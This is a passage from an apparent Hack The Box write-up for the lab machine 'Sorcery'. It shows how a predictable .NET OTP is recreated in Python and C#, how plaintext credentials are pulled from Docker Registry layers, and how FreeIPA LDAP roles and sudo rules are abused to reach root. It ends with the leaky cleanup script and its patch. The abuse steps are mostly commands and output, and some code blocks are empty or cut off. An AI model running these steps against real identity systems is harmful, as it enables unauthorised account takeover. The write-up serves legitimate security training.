This function is very simple. It seeds the `Random` function with the current minute (0-59) divided by 10 plus the executable owner’s user ID, and then gets a number between 100000 and 999999. This explains what I observed on the unintended path, where there are only six different values.

This function also doesn’t work. It creates the random number, but then doesn’t even store it in a variable. Then it prints and exits.

There are a couple ways to recreate these values. I passed the C# function to Claude:

![image-20260419165752610](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260419165752610.webp)

It recreated the algorithm that C# uses in Python:

```python
#!/usr/bin/env python3
"""Replicate .NET HandleOtp: new Random(Minute/10 + uid).Next(100000, 999999)."""

from datetime import datetime

MBIG = 2147483647
MSEED = 161803398

class DotNetRandom:
    """Port of .NET's seeded System.Random (Knuth subtractive generator).
    See referencesource.microsoft.com/#mscorlib/system/random.cs"""

    def __init__(self, seed: int):
        seed_array = [0] * 56
        subtraction = MBIG if seed == -2147483648 else abs(seed)
        mj = MSEED - subtraction
        seed_array[55] = mj
        mk = 1
        for i in range(1, 55):
            ii = (21 * i) % 55
            seed_array[ii] = mk
            mk = mj - mk
            if mk < 0:
                mk += MBIG
            mj = seed_array[ii]
        for _ in range(1, 5):
            for i in range(1, 56):
                seed_array[i] -= seed_array[1 + (i + 30) % 55]
                if seed_array[i] < 0:
                    seed_array[i] += MBIG
        self.seed_array = seed_array
        self.inext = 0
        self.inextp = 21

    def _internal_sample(self) -> int:
        self.inext = 1 if self.inext + 1 >= 56 else self.inext + 1
        self.inextp = 1 if self.inextp + 1 >= 56 else self.inextp + 1
        r = self.seed_array[self.inext] - self.seed_array[self.inextp]
        if r == MBIG:
            r -= 1
        if r < 0:
            r += MBIG
        self.seed_array[self.inext] = r
        return r

    def sample(self) -> float:
        return self._internal_sample() * (1.0 / MBIG)

    def next(self, min_value: int, max_value: int) -> int:
        # max_value is EXCLUSIVE in .NET
        return int(self.sample() * (max_value - min_value)) + min_value

def handle_otp(uid: int, minute: int | None = None) -> int:
    if minute is None:
        minute = datetime.now().minute
    seed = minute // 10 + uid
    return DotNetRandom(seed).next(100000, 999999)

if __name__ == "__main__":
    import sys

    uid = int(sys.argv[1]) if len(sys.argv) > 1 else 2003
    now = datetime.now()
    print(f"current time: {now.isoformat()} (minute={now.minute}, block={now.minute // 10})")
    print(f"current OTP : {handle_otp(uid):06d}")
    print("\nall 6 OTPs for this hour (uid={}):".format(uid))
    for block in range(6):
        m = block * 10
        otp = DotNetRandom(block + uid).next(100000, 999999)
        print(f"  minute {m:02d}-{m+9:02d} (seed {block + uid}): {otp:06d}")
```

It gives the same values as [above](#password-recovery-via-strace):

```
oxdf@hacky$ uv run dotnet_otp.py 
current time: 2026-04-19T20:59:00.043469 (minute=59, block=5)
current OTP : 780645

all 6 OTPs for this hour (uid=2003):
  minute 00-09 (seed 2003): 229732
  minute 10-19 (seed 2004): 699914
  minute 20-29 (seed 2005): 270098
  minute 30-39 (seed 2006): 740280
  minute 40-49 (seed 2007): 310463
  minute 50-59 (seed 2008): 780645
```

I could also write this as a.NET application on my Linux VM. First create a new app:

```
oxdf@hacky$ dotnet new console -n recover_otp

Welcome to .NET 8.0!

  Determining projects to restore...
  Restored ~/hackthebox/sorcery-10.129.25.147/recover_otp/recover_otp.csproj (in 489 ms).
Restore succeeded.
```

This creates a project, including a `Program.cs` file:

```
oxdf@hacky$ ls recover_otp/
bin  obj  Program.cs  recover_otp.csproj
```

I’ll overwrite `Program.cs` with a simple loop to show the seeds:

```cs
for (int min = 0; min < 6; min ++) {
        int seed = min + 2003;
        int otp = new Random(seed).Next(100000, 999999);
        Console.WriteLine($"{min}0-{min}9: {otp}");
}
```

Now I’ll run it:

```
oxdf@hacky$ dotnet run --project recover_otp/
00-09: 229732
10-19: 699914
20-29: 270098
30-39: 740280
40-49: 310463
50-59: 780645
```

#### Authenticate to Docker Registry

The easiest way to pass these creds to Docker Registry is using the `-u <user>:<password>` option with `curl`:

```
tom_summers_admin@main:~$ curl  localhost:5000/v2/
{"errors":[{"code":"UNAUTHORIZED","message":"authentication required","detail":null}]}
tom_summers_admin@main:~$ curl -u 'rebecca_smith:-7eAZDp9-f9mg270098' localhost:5000/v2/
{}
```

### Recover Password

Updating the OTP as needed as time goes on, I’ll enumerate the Docker Registry. There’s only one repository:

```
tom_summers_admin@main:~$ curl -u 'rebecca_smith:-7eAZDp9-f9mg740280' localhost:5000/v2/_catalog
{"repositories":["test-domain-workstation"]}
```

It has only one tag:

```
tom_summers_admin@main:~$ curl -u 'rebecca_smith:-7eAZDp9-f9mg740280' localhost:5000/v2/test-domain-workstation/tags/list
{"name":"test-domain-workstation","tags":["latest"]}
```

It has a bunch of layers and history:

```
tom_summers_admin@main:~$ curl -u 'rebecca_smith:-7eAZDp9-f9mg740280' localhost:5000/v2/test-domain-workstation/manifests/latest

Rather than manually figure these out, I’ll use [DockerRegistryGrabber](https://github.com/Syzik/DockerRegistryGrabber.git). I’ll reconnect SSH with `-L 5000:127.0.0.1:5000` so that port 5000 on my host forwards to the registry.

This tool can list the repos:

```
oxdf@hacky$ uv run drg.py http://localhost --list -U rebecca_smith -P'-7eAZDp9-f9mg270098'
[+] test-domain-workstation
```

And then dump the layers:

```
oxdf@hacky$ uv run drg.py http://localhost --dump test-domain-workstation -U rebecca_smith -P'-7eAZDp9-f9mg270098'

This saves each to a directory on my host. Three are big, and two are small:

```
oxdf@hacky$ ls -l test-domain-workstation

```

The 32-byte one is empty, but the 246-byte one has a `docker-entrypoint.sh`:

```
oxdf@hacky$ tar -vtf a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4.tar.gz
oxdf@hacky$ tar -vtf 292e59a87dfb0fb3787c3889e4c1b81bfef0cd2f3378c61f281a4c7a02ad1787.tar.gz
-rwx------ 0/0             181 2024-10-30 18:03 docker-entrypoint.sh
```

I’ll extract that script:

```
oxdf@hacky$ tar -xf 292e59a87dfb0fb3787c3889e4c1b81bfef0cd2f3378c61f281a4c7a02ad1787.tar.gz
oxdf@hacky$ cat docker-entrypoint.sh 
#!/bin/bash

ipa-client-install --unattended --principal donna_adams --password 3FEVPCT_c3xDH \
    --server dc01.sorcery.htb --domain sorcery.htb --no-ntp --force-join --mkhomedir
```

There is a username and password in there!

### SSH

I’m able to SSH as donna\_adams:

```
oxdf@hacky$ sshpass -p '3FEVPCT_c3xDH' ssh donna_adams@sorcery.htb
Creating directory '/home/donna_adams'.
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-60-generic x86_64)
...[snip]...
$ bash
donna_adams@main:~$
```

## Shell as ash\_winter

### Enumeration

#### User

The donna\_adams user’s home directory is very empty:

```
donna_adams@main:~$ find . -type f
./.profile
./.cache/motd.legal-displayed
./.bashrc
./.bash_logout
```

They cannot run `sudo`:

```
donna_adams@main:~$ sudo -l
[sudo] password for donna_adams: 
Sorry, user donna_adams may not run sudo on localhost.
```

And are not a member of any interesting groups on this computer:

```
donna_adams@main:~$ id
uid=1638400003(donna_adams) gid=1638400003(donna_adams) groups=1638400003(donna_adams)
```

The uid `1638400003` is far above the 65535 range a plain Linux system would ever hand out from `/etc/passwd`. Uids in this range are being issued centrally, which leads directly into the identity stack on `main`.

#### SSSD / FreeIPA

`main` is joined to a FreeIPA realm via `ipa-client-install`, and resolves users / groups / netgroups / sudo rules through [SSSD](https://sssd.io/). The configuration is spread across three files.

`/etc/nsswitch.conf` routes NSS lookups through `sss` after local `files`:

```
# Generated by authselect
# Do not modify this file manually, use authselect instead. Any user changes will be overwritten.
# You can stop authselect from managing your configuration by calling 'authselect opt-out'.
# See authselect(8) for more details.

# In order of likelihood of use to accelerate lookup.
passwd:     files sss systemd
shadow:     files
group:      files sss systemd
hosts:      files myhostname resolve [!UNAVAIL=return] dns
services:   files sss
netgroup:   files sss
sudoers:    files sss
automount:  files sss

aliases:    files
ethers:     files
gshadow:    files
networks:   files dns
protocols:  files
publickey:  files
rpc:        files
```

This is why donna\_adams can SSH and `getent passwd donna_adams` works even though they aren’t in `/etc/passwd`:

```
donna_adams@main:~$ getent passwd donna_adams
donna_adams:*:1638400003:1638400003:donna adams:/home/donna_adams:/bin/sh
```

The entry comes from the IPA directory via SSSD. `sudoers: files sss` means `sudo` rules can also be pushed centrally (not just from `/etc/sudoers`).

`/etc/ipa/default.conf` was written by `ipa-client-install` and names the realm, domain, and server:

```
#File modified by ipa-client-install

[global]
basedn = dc=sorcery,dc=htb
realm = SORCERY.HTB
domain = sorcery.htb
server = dc01.sorcery.htb
host = main.sorcery.htb
xmlrpc_uri = https://dc01.sorcery.htb/ipa/xml
enable_ra = True
```

`/etc/krb5.conf` wires Kerberos to the same server for TGT issuance, admin, and password change:

```
#File modified by ipa-client-install

includedir /etc/krb5.conf.d/
[libdefaults]
  default_realm = SORCERY.HTB
  dns_lookup_realm = false
  rdns = false
  dns_canonicalize_hostname = false
  dns_lookup_kdc = true
  ticket_lifetime = 24h
  forwardable = true
  udp_preference_limit = 0
  default_ccache_name = KEYRING:persistent:%{uid}

[realms]
  SORCERY.HTB = {
    kdc = dc01.sorcery.htb:88
    master_kdc = dc01.sorcery.htb:88
    admin_server = dc01.sorcery.htb:749
    kpasswd_server = dc01.sorcery.htb:464
    default_domain = sorcery.htb
    pkinit_anchors = FILE:/var/lib/ipa-client/pki/kdc-ca-bundle.pem
    pkinit_pool = FILE:/var/lib/ipa-client/pki/ca-bundle.pem

  }

[domain_realm]
  .sorcery.htb = SORCERY.HTB
  sorcery.htb = SORCERY.HTB
  main.sorcery.htb = SORCERY.HTB
```

SSH password authentication flows through PAM, and with `pam_sss` in the stack SSSD performs a `kinit` against the IPA KDC on a successful password check. That means after logging in I already have a TGT:

```
donna_adams@main:~$ klist
Ticket cache: KEYRING:persistent:1638400003:krb_ccache_zGbGVN4
Default principal: donna_adams@SORCERY.HTB

Valid starting     Expires            Service principal
04/20/26 14:12:36  04/21/26 13:49:26  krbtgt/SORCERY.HTB@SORCERY.HTB
```

`dc01.sorcery.htb` is the Docker container I noticed [above](#host) with multiple `docker-proxy` forwarders:

```
donna_adams@main:~$ getent hosts dc01.sorcery.htb
172.23.0.2      dc01.sorcery.htb
```

#### Client tools available

The standard `ipa-client-install` payload is here:

```
donna_adams@main:~$ which ipa kinit ldapsearch ksu
/usr/bin/ipa
/usr/bin/kinit
/usr/bin/ldapsearch
/usr/bin/ksu
```
- `ipa` - the Python CLI that talks to the IPA JSON-RPC API over HTTPS, authenticated with the Kerberos ticket.
- `kinit` / `klist` / `kdestroy` - ticket lifecycle.
- `ldapsearch` - direct LDAP to `dc01.sorcery.htb:389`, useful when the `ipa` wrapper hides an attribute.
- `ksu` - Kerberized `su` (rarely needed, but present).

#### Directory contents

`ipa user-find` against the IPA server shows only three principals in `cn=users,cn=accounts,dc=sorcery,dc=htb`:

```
donna_adams@main:~$ ipa user-find --all | grep -E 'User login|Member of groups|Member of HBAC'
  User login: admin
  Member of groups: admins, trust admins
  Member of HBAC rule: allow_ssh, allow_sudo
  User login: ash_winter
  Member of groups: ipausers
  Member of HBAC rule: allow_ssh, allow_sudo
  User login: donna_adams
  Member of groups: ipausers
  Member of HBAC rule: allow_ssh, allow_sudo
```

The realm has a superuser admin plus two regular users, ash\_winter and donna\_adams. Both regular users are granted remote login and sudo on IPA-enrolled hosts via the `allow_ssh` and `allow_sudo` HBAC rules, which is why my `donna_adams` SSH login to `main` worked.

I’ll pull more information on donna\_adams:

```
donna_adams@main:~$ ipa user-show donna_adams
  User login: donna_adams
  First name: donna
  Last name: adams
  Home directory: /home/donna_adams
  Login shell: /bin/sh
  Principal name: donna_adams@SORCERY.HTB
  Principal alias: donna_adams@SORCERY.HTB
  Email address: donna_adams@sorcery.htb
  UID: 1638400003
  GID: 1638400003
  Account disabled: False
  Password: True
  Member of groups: ipausers
  Member of HBAC rule: allow_sudo, allow_ssh
  Indirect Member of role: change_userPassword_ash_winter_ldap
  Kerberos keys available: True
```

They have an interesting “Indirect Member of role”. donna\_adams doesn’t have permissions to get information about that role:

```
donna_adams@main:~$ ipa role-show change_userPassword_ash_winter_ldap
ipa: ERROR: change_userPassword_ash_winter_ldap: role not found
```

### Change Password / SSH

While I can’t see explicitly what this role allows, the name is a pretty good hint. Presumably donna\_adams can change the password of ash\_winter over LDAP. There are a few ways to try this. The following don’t work:

- `ldappasswd -Y GSSAPI -H ldap://dc01.sorcery.htb -s '0xdf0xdf.' uid=ash_winter,cn=users,cn=accounts,dc=sorcery,dc=htb`
- `ipa passwd ash_winter`

Both of those go through IPA’s higher-level password-change operation (the LDAP Modify Password extended op for `ldappasswd`, and the IPA API for `ipa passwd`), which this role doesn’t grant. What it does grant is the ability to write the `userPassword` attribute directly, so a raw `ldapmodify` does work:

```
donna_adams@main:~$ ldapmodify -Y GSSAPI -H ldap://dc01.sorcery.htb <<'EOF'
> dn: uid=ash_winter,cn=users,cn=accounts,dc=sorcery,dc=htb
> changetype: modify
> replace: userPassword
> userPassword: 0xdf0xdf.
> EOF
SASL/GSSAPI authentication started
SASL username: donna_adams@SORCERY.HTB
SASL SSF: 256
SASL data security layer installed.
modifying entry "uid=ash_winter,cn=users,cn=accounts,dc=sorcery,dc=htb"
```

I can SSH, but I’ll need to change my password (so `sshpass` won’t work):

```
oxdf@hacky$ sshpass -p '0xdf0xdf.' ssh ash_winter@sorcery.htb
Password expired. Change your password now.
oxdf@hacky$ ssh ash_winter@sorcery.htb
(ash_winter@sorcery.htb) Password: 
Password expired. Change your password now.
(ash_winter@sorcery.htb) Current Password: 
(ash_winter@sorcery.htb) New password: 
(ash_winter@sorcery.htb) Retype new password: 
Creating directory '/home/ash_winter'.
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-60-generic x86_64)
...[snip]...
$ bash
ash_winter@main:~$
```

`ipa user-mod ash_winter --setattr userPassword=0xdf0xdf.` and `ipa user-mod ash_winter --passwd` both work as well.

## Shell as root

### Enumeration

ash\_winter has the ability to restart `sssd` with `sudo`:

```
ash_winter@main:~$ sudo -l
Matching Defaults entries for ash_winter on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User ash_winter may run the following commands on localhost:
    (root) NOPASSWD: /usr/bin/systemctl restart sssd
```

I’ll check out ash\_winter as a user in IPA:

```
ash_winter@main:~$ ipa user-show ash_winter
  User login: ash_winter
  First name: ash
  Last name: winter
  Home directory: /home/ash_winter
  Login shell: /bin/sh
  Principal name: ash_winter@SORCERY.HTB
  Principal alias: ash_winter@SORCERY.HTB
  Email address: ash_winter@sorcery.htb
  UID: 1638400004
  GID: 1638400004
  Account disabled: False
  Password: True
  Member of groups: ipausers
  Member of HBAC rule: allow_ssh, allow_sudo
  Indirect Member of role: add_sysadmin
  Kerberos keys available: True
```

Just like with donna\_adams, ash\_winter doesn’t have permissions to view this role:

```
ash_winter@main:~$ ipa role-show add_sysadmin
ipa: ERROR: add_sysadmin: role not found
```

There are five groups in this instance:

```
ash_winter@main:~$ ipa group-find --all
----------------
5 groups matched
----------------
  dn: cn=admins,cn=groups,cn=accounts,dc=sorcery,dc=htb

```

One is named sysadmins, and it’s a member of manage\_sudorules\_ldap!

I’ll get a list of the existing `sudo` rules:

```
ash_winter@main:~$ ipa sudorule-find
-------------------
1 Sudo Rule matched
-------------------
  Rule name: allow_sudo
  Enabled: True
  Host category: all
  Command category: all
  RunAs User category: all
  RunAs Group category: all
----------------------------
Number of entries returned 1
----------------------------
```

This rule lets users with it assigned to them run any command as any user.

### sudo Access

I’ll have ash\_winter add themselves to `sysadmins`:

```
ash_winter@main:~$ ipa group-add-member sysadmins --users=ash_winter
  Group name: sysadmins
  GID: 1638400005
  Member users: ash_winter
  Indirect Member of role: manage_sudorules_ldap
-------------------------
Number of members added 1
-------------------------
```

It worked. I can verify that ash\_winter is in the sysadmins group:

```
ash_winter@main:~$ ipa group-show sysadmins --all
  dn: cn=sysadmins,cn=groups,cn=accounts,dc=sorcery,dc=htb
  Group name: sysadmins
  GID: 1638400005
  Member users: ash_winter
  Indirect Member of role: manage_sudorules_ldap
  ipantsecurityidentifier: S-1-5-21-820725746-4072777037-1046661441-1005
  ipauniqueid: d038b410-96eb-11ef-ace5-0242ac170002
  objectclass: top, groupofnames, nestedgroup, ipausergroup, ipaobject, posixgroup, ipantgroupattrs
ash_winter@main:~$ ipa group-find --user=ash_winter
----------------
2 groups matched
----------------
  Group name: ipausers
  Description: Default group for all users

  Group name: sysadmins
  GID: 1638400005
----------------------------
Number of entries returned 2
----------------------------
```

I’ll attach the `allow_sudo` rule to ash\_winter:

```
ash_winter@main:~$ ipa sudorule-add-user allow_sudo --users=ash_winter
  Rule name: allow_sudo
  Enabled: True
  Host category: all
  Command category: all
  RunAs User category: all
  RunAs Group category: all
  Users: admin, ash_winter
-------------------------
Number of members added 1
-------------------------
```

It worked, but it won’t show up right away:

```
ash_winter@main:~$ sudo -l
Matching Defaults entries for ash_winter on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User ash_winter may run the following commands on localhost:
    (root) NOPASSWD: /usr/bin/systemctl restart sssd
```

First I need to restart `sssd`:

```
ash_winter@main:~$ sudo systemctl restart sssd
ash_winter@main:~$ sudo -l
Matching Defaults entries for ash_winter on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User ash_winter may run the following commands on localhost:
    (root) NOPASSWD: /usr/bin/systemctl restart sssd
    (ALL : ALL) ALL
```

And it worked! For some reason, `sudo -i` doesn’t work:

```
ash_winter@main:~$ sudo -i
sudo: PAM account management error: Permission denied
sudo: a password is required
```

But `sudo su -` does:

```
ash_winter@main:~$ sudo su -
root@main:~#
```

And read the root flag:

```
root@main:~# cat root.txt
dd45620a************************
```

## Beyond Root - Cleanup Abuse

### Shortcut Overview

There’s a cleanup script that leaks the password for ash\_winter before it was [patched just before this box retired](#patch). Observing this allows for skipping all the way from having an initial shell as tom\_summers to the final pre-root shell of ash\_winter:

```

```

### Abuse Process Monitoring

It’s not super easy to catch with [pspy](https://github.com/DominicBreuker/pspy), but it is possible:

```
2026/04/19 14:11:02 CMD: UID=1638400000 PID=338127 | /usr/bin/python3 -I /usr/bin/ipa user-mod ash_winter --setattr userPassword=w@LoiU8Crmdep 
2026/04/19 14:31:02 CMD: UID=1638400000 PID=371376 | /usr/bin/python3 -I /usr/bin/ipa user-mod ash_winter --setattr userPassword=w@LoiU8Crmdep 
2026/04/19 15:51:02 CMD: UID=1638400000 PID=504188 | /usr/bin/python3 -I /usr/bin/ipa user-mod ash_winter --setattr userPassword=w@LoiU8Crmdep 
2026/04/19 16:01:02 CMD: UID=1638400000 PID=520791 | /usr/bin/python3 -I /usr/bin/ipa user-mod ash_winter --setattr userPassword=w@LoiU8Crmdep
```

It seems to run every 10 minutes, and gives away the password for ash\_winter!

On a clean boot, this works:

```
oxdf@hacky$ ssh ash_winter@sorcery.htb
(ash_winter@sorcery.htb) Password: 
Password expired. Change your password now.
(ash_winter@sorcery.htb) Current Password: 
(ash_winter@sorcery.htb) New password: 
(ash_winter@sorcery.htb) Retype new password: 
Creating directory '/home/ash_winter'.
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-60-generic x86_64)
...[snip]...
$
```

Interestingly, once the password is changed, it never changes back! I’ll show why below.

### Cleanup Details

#### As tom\_summers

As tom\_summers I can see a service called Cleanup at `/etc/systemd/system/cleanup.service`:

```
[Unit]
Description=Run IPA cleanup script

[Service]
Type=oneshot
User=admin
ExecStart=/opt/scripts/cleanup.sh
```

It runs `/opt/scripts/cleanup.sh`, which only admins can access:

```
tom_summers@main:~$ ls -l /opt/
total 8
drwx--x--x 4 root  root   4096 Oct 31  2024 containerd
drwx------ 2 admin admins 4096 Apr 25  2025 scripts
```

`/etc/systemd/system/cleanup.timer` shows that it runs every 10 minutes:

```
[Unit]
Description=Run IPA cleanup script every 10 minutes

[Timer]
OnBootSec=10min
OnUnitActiveSec=10min
Unit=cleanup.service

[Install]
WantedBy=timers.target
```

#### As root

As root, I can access `cleanup.sh`:

```bash
#!/bin/bash

export KRB5CCNAME=/tmp/krb5cc_admin_cron
kinit -k -t /opt/scripts/admin.keytab admin

split() {
    awk -F: '{ print $2 }' | tr -d ' ' | tr ',' '\n'
}

sysadmins=$(ipa group-show sysadmins)
for group in $(echo "$sysadmins" | grep "Member groups: " | split); do
    ipa group-remove-member sysadmins --group "$group";
done
for user in $(echo "$sysadmins" | grep "Member users: " | grep -v "Indirect" | split); do
    ipa group-remove-member sysadmins --user "$user";
done

for rule in $(ipa sudorule-find | grep "Rule name: " | split); do
    output=$(ipa sudorule-show "$rule");
    for user in $(echo "$output" | grep "Users: " | split); do
         if [ "$user" = "admin" ] && [ "$rule" = "allow_sudo" ]; then
             continue;
         fi
         ipa sudorule-remove-user "$rule" --user "$user";
    done
    for group in $(echo "$output" | grep "User Groups: " | split); do
         ipa sudorule-remove-user "$rule" --group "$group";
    done
    if [ "$rule" != "allow_sudo" ]; then
        ipa sudorule-del "$rule";
    fi
done

ipa user-mod ash_winter --setattr userPassword=w@LoiU8Crmdep
```

It is resetting all the groups and rules that get changed in the final steps, and then resets ash\_winter’s password. To auth, it configures `/tmp/krb5cc_admin_cron` as an output file, and then uses `/opt/scripts/admin.keytab` to auth.

The problem is that `kinit -k -t admin.keytab admin` fails:

```
root@main:/opt/scripts# kinit -k -t ./admin.keytab admin
kinit: Password has expired while getting initial credentials
```

The admin user’s password expired. It looks like it expired just over a month after release (on June 14, 2025):

```

### Patch

This was patched on 24 April 2026, just before the box retired:

![image-20260424164957753](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260424164957753.webp)

Now the last line of the script has been replaced with:

```bash
read -r IPA_PASS < /opt/scripts/ash_password
#ipa user-mod ash_winter --setattr userPassword=w@LoiU8Crmdep
ipa passwd ash_winter < <(printf '%s\n%s\n' "$IPA_PASS" "$IPA_PASS")
```

It’s reading the password from a file rather than printing it somewhere that will show up in the process list.

They also fixed the user’s expired password:

![image-20260424165533220](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260424165533220.webp)

Now the auth as admin works:

```
root@main:/opt/scripts# kinit -k -t ./admin.keytab admin
root@main:/opt/scripts# klist
Ticket cache: KEYRING:persistent:0:0
Default principal: admin@SORCERY.HTB

04/24/26 20:50:11  04/25/26 20:33:20  krbtgt/SORCERY.HTB@SORCERY.HTB
```

I can confirm that the password now expires in 2099:

```
root@main:/# docker exec -it ipa-dc01.sorcery.htb-1 kadmin.local -q 'getprinc admin'
